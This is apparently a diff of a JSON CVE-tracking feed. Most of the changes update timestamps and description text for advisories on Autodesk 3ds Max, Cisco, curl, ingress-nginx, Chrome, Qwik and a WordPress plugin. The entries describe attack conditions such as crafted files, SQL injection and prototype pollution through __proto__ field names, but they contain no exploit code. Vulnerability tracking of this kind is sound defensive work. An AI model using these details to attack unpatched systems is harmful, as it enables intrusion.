     "description": "A maliciously crafted RGB file, when parsed through Autodesk 3ds Max, can force a Memory Corruption vulnerability. A malicious actor can leverage this vulnerability to execute arbitrary code in the context of the current process.",
     "repos": [],
-    "updated": "2026-02-04T18:30:51",
+    "updated": "2026-02-06T16:26:55.207000",
     "epss": 0.015
   },
   "CVE-2026-0660": {
@@ -12184,7 +12205,7 @@
     ],
     "description": "A maliciously crafted GIF file, when parsed through Autodesk 3ds Max, can cause a Stack-Based Buffer Overflow vulnerability. A malicious actor can leverage this vulnerability to execute arbitrary code in the context of the current process.",
     "repos": [],
-    "updated": "2026-02-06T17:48:33.337000",
+    "updated": "2026-02-04T18:30:51",
     "epss": 0.006
   },
   "CVE-2026-0537": {
@@ -12280,7 +12301,7 @@
     ],
     "description": "A maliciously crafted RGB file, when parsed through Autodesk 3ds Max, can force a Memory Corruption vulnerability. A malicious actor can leverage this vulnerability to execute arbitrary code in the context of the current process.",
     "repos": [],
-    "updated": "2026-02-04T18:30:50",
+    "updated": "2026-02-06T17:49:40.607000",
     "epss": 0.015
   },
   "CVE-2026-20119": {
@@ -12374,9 +12395,9 @@
         "created_at": "2026-02-04T17:17:18.000Z"
       }
     ],
-    "description": "A vulnerability in the text rendering subsystem of Cisco TelePresence Collaboration Endpoint (CE) Software and Cisco RoomOS Software could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device.\n\nThis vulnerability is due to insufficient validation of input received by an affected device. An attacker could exploit this vulnerability by getting the affected device to render crafted text, for example, a crafted meeting invitation. As indicated in the CVSS score, no user interaction is required, such as accepting the meeting invitation. A successful exploit could allow the attacker to cause the affected device to reload, resulting in a DoS condition.",
+    "description": "A vulnerability in the text rendering subsystem of Cisco TelePresence Collaboration Endpoint (CE) Software and Cisco RoomOS Software could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device.\r\n\r\nThis vulnerability is due to insufficient validation of input received by an affected device. An attacker could exploit this vulnerability by getting the affected device to render crafted text, for example, a crafted meeting invitation. As indicated in the CVSS score, no user interaction is required, such as accepting the meeting invitation. A successful exploit could allow the attacker to cause the affected device to reload, resulting in a DoS condition.",
     "repos": [],
-    "updated": "2026-02-04T18:30:51",
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.076
   },
   "CVE-2026-20098": {
@@ -12470,9 +12491,9 @@
         "created_at": "2026-02-04T17:17:08.000Z"
       }
     ],
-    "description": "A vulnerability in the Certificate Management feature of Cisco Meeting Management could allow an authenticated, remote attacker to upload arbitrary files, execute arbitrary commands, and elevate privileges to root on an affected system.\r\n\r\nThis vulnerability is due to improper input validation in certain sections of the web-based management interface. An attacker could exploit this vulnerability&nbsp;by sending a crafted HTTP request to an affected system. A successful exploit could allow the attacker to upload arbitrary files to the affected system. The malicious files could overwrite system files that are processed by the&nbsp;root system account and allow arbitrary command execution with&nbsp;root privileges. To exploit this vulnerability, the attacker must have valid credentials for a user account with at least the role of video operator.",
+    "description": "A vulnerability in the Certificate Management feature of Cisco Meeting Management could allow an authenticated, remote attacker to upload arbitrary files, execute arbitrary commands, and elevate privileges to root on an affected system.\n\nThis vulnerability is due to improper input validation in certain sections of the web-based management interface. An attacker could exploit this vulnerability&nbsp;by sending a crafted HTTP request to an affected system. A successful exploit could allow the attacker to upload arbitrary files to the affected system. The malicious files could overwrite system files that are processed by the&nbsp;root system account and allow arbitrary command execution with&nbsp;root privileges. To exploit this vulnerability, the attacker must have valid credentials for a user account with at least the role of video operator.",
     "repos": [],
-    "updated": "2026-02-05T14:57:34.297000",
+    "updated": "2026-02-04T18:30:53",
     "epss": 0.899
   },
   "CVE-2026-24512": {
@@ -12683,7 +12704,7 @@
     ],
     "description": "A maliciously crafted GIF file, when parsed through Autodesk 3ds Max, can force an Out-of-Bounds Write vulnerability. A malicious actor can leverage this vulnerability to execute arbitrary code in the context of the current process.",
     "repos": [],
-    "updated": "2026-02-04T18:30:51",
+    "updated": "2026-02-06T17:49:06.210000",
     "epss": 0.015
   },
   "CVE-2026-0662": {
@@ -12793,7 +12814,7 @@
     "repos": [
       "https://github.com/songqb-xx/CVE-2025-57529"
     ],
-    "updated": "2026-02-04T16:34:21.763000",
+    "updated": "2026-02-04T18:31:36",
     "epss": 0.044000000000000004
   },
   "CVE-2025-66374": {
@@ -12901,7 +12922,7 @@
     ],
     "description": "Boltz 2.0.0 contains an insecure deserialization vulnerability in its molecule loading functionality. The application uses Python pickle to deserialize molecule data files without validation. An attacker with the ability to place a malicious pickle file in a directory processed by boltz can achieve arbitrary code execution when the file is loaded.",
     "repos": [],
-    "updated": "2026-02-04T19:43:53",
+    "updated": "2026-02-04T16:34:21.763000",
     "epss": 0.055999999999999994
   },
   "CVE-2026-24735": {
@@ -13069,7 +13090,7 @@
     "epss": 0.135
   },
   "CVE-2026-1341": {
-    "cvss3": 0,
+    "cvss3": null,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -13131,7 +13152,7 @@
     ],
     "description": "Avation Light Engine Pro exposes its configuration and control interface without any authentication or access control.",
     "repos": [],
-    "updated": "2026-02-04T16:33:44.537000",
+    "updated": "2026-02-04T00:30:40",
     "epss": 0.016
   },
   "CVE-2025-59818": {
@@ -13185,7 +13206,7 @@
     ],
     "description": "This vulnerability allows authenticated attackers to execute arbitrary commands on the underlying system using the file name of an uploaded file.",
     "repos": [],
-    "updated": "2026-02-04T18:30:39",
+    "updated": "2026-02-04T16:33:44.537000",
     "epss": 0.095
   },
   "CVE-2025-67987": {
@@ -13359,7 +13380,7 @@
     ],
     "description": "The Infility Global plugin for WordPress is vulnerable to unauthenticated SQL Injection via the 'infility_get_data' API action in all versions up to, and including, 2.14.46. This is due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append - with certain server configurations - additional SQL queries into already existing queries that can be used to extract sensitive information from the database.",
     "repos": [],
-    "updated": "2026-02-04T16:33:44.537000",
+    "updated": "2026-02-04T09:30:36",
     "epss": 0.07100000000000001
   },
   "CVE-2026-1819": {
@@ -13497,7 +13518,7 @@
           "header_static": "https://ioc.exchange/headers/original/missing.png",
           "followers_count": 63,
           "following_count": 0,
-          "statuses_count": 1065,
+          "statuses_count": 1076,
           "last_status_at": "2026-02-08",
           "hide_collections": false,
           "emojis": [],
@@ -13540,7 +13561,7 @@
           "header_static": "https://ioc.exchange/headers/original/missing.png",
           "followers_count": 63,
           "following_count": 0,
-          "statuses_count": 1065,
+          "statuses_count": 1076,
           "last_status_at": "2026-02-08",
           "hide_collections": false,
           "emojis": [],
@@ -13551,9 +13572,9 @@
         "created_at": "2026-02-03T14:08:07.000Z"
       }
     ],
-    "description": "1. A cookie is set using the `secure` keyword for `https://target` \n 2. curl is redirected to or otherwise made to speak with `http://target` (same \n   hostname, but using clear text HTTP) using the same cookie set \n 3. The same cookie name is set - but with just a slash as path (`path=\\\"/\\\",`).\n   Since this site is not secure, the cookie *should* just be ignored.\n4. A bug in the path comparison logic makes curl read outside a heap buffer\n   boundary\n\nThe bug either causes a crash or it potentially makes the comparison come to\nthe wrong conclusion and lets the clear-text site override the contents of the\nsecure cookie, contrary to expectations and depending on the memory contents\nimmediately following the single-byte allocation that holds the path.\n\nThe presumed and correct behavior would be to plainly ignore the second set of\nthe cookie since it was already set as secure on a secure host so overriding\nit on an insecure host should not be okay.",
+    "description": "1. A cookie is set using the `secure` keyword for `https://target`\n2. curl is redirected to or otherwise made to speak with `http://target` (same\n   hostname, but using clear text HTTP) using the same cookie set\n3. The same cookie name is set - but with just a slash as path (`path='/'`).\n   Since this site is not secure, the cookie *should* just be ignored.\n4. A bug in the path comparison logic makes curl read outside a heap buffer\n   boundary\n\nThe bug either causes a crash or it potentially makes the comparison come to\nthe wrong conclusion and lets the clear-text site override the contents of the\nsecure cookie, contrary to expectations and depending on the memory contents\nimmediately following the single-byte allocation that holds the path.\n\nThe presumed and correct behavior would be to plainly ignore the second set of\nthe cookie since it was already set as secure on a secure host so overriding\nit on an insecure host should not be okay.",
     "repos": [],
-    "updated": "2026-01-20T14:58:01.347000",
+    "updated": "2026-01-20T15:31:21",
     "epss": 0.026
   },
   "CVE-2026-1580": {
@@ -13607,7 +13628,7 @@
     ],
     "description": "A security issue was discovered in ingress-nginx\u00a0where the `nginx.ingress.kubernetes.io/auth-method` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)",
     "repos": [],
-    "updated": "2026-02-04T20:06:10",
+    "updated": "2026-02-04T16:33:44.537000",
     "epss": 0.095
   },
   "CVE-2026-1862": {
@@ -13661,7 +13682,7 @@
     ],
     "description": "Type Confusion in V8 in Google Chrome prior to 144.0.7559.132 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)",
     "repos": [],
-    "updated": "2026-02-04T00:30:28",
+    "updated": "2026-02-04T16:33:44.537000",
     "epss": 0.024
   },
   "CVE-2026-1861": {
@@ -13715,7 +13736,7 @@
     ],
     "description": "Heap buffer overflow in libvpx in Google Chrome prior to 144.0.7559.132 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)",
     "repos": [],
-    "updated": "2026-02-04T00:31:33",
+    "updated": "2026-02-04T16:33:44.537000",
     "epss": 0.021
   },
   "CVE-2026-25150": {
@@ -13767,9 +13788,9 @@
         "created_at": "2026-02-03T22:20:16.000Z"
       }
     ],
-    "description": "Qwik is a performance focused javascript framework. Prior to version 1.19.0, a prototype pollution vulnerability exists in the formToObj() function within @builder.io/qwik-city middleware. The function processes form field names with dot notation (e.g., user.name) to create nested objects, but fails to sanitize dangerous property names like __proto__, constructor, and prototype. This allows unauthenticated attackers to pollute Object.prototype by sending crafted HTTP POST requests, potentially leading to privilege escalation, authentication bypass, or denial of service. This issue has been patched in version 1.19.0.",
+    "description": "### Summary\n\nA Prototype Pollution vulnerability exists in the `formToObj()` function within `@builder.io/qwik-city` middleware. The function processes form field names with dot notation (e.g., `user.name`) to create nested objects, but fails to sanitize dangerous property names like `__proto__`, `constructor`, and `prototype`. This allows unauthenticated attackers to pollute `Object.prototype` by sending crafted HTTP POST requests, potentially leading to privilege escalation, authentication bypass, or denial of service.\n\n### Impact\nAn unauthenticated attacker can supply specially crafted form field names that cause formToObj() to write dangerous keys (for example __proto__, constructor, prototype) into parsed objects. This results in Prototype Pollution of the server process and can cause privilege escalation, auth bypass, denial-of-service, or other global application integrity failures depending on how objects are used.",
     "repos": [],
-    "updated": "2026-02-04T16:33:44.537000",
+    "updated": "2026-02-04T17:45:45",
     "epss": 0.022000000000000002
   },
   "CVE-2026-25510": {
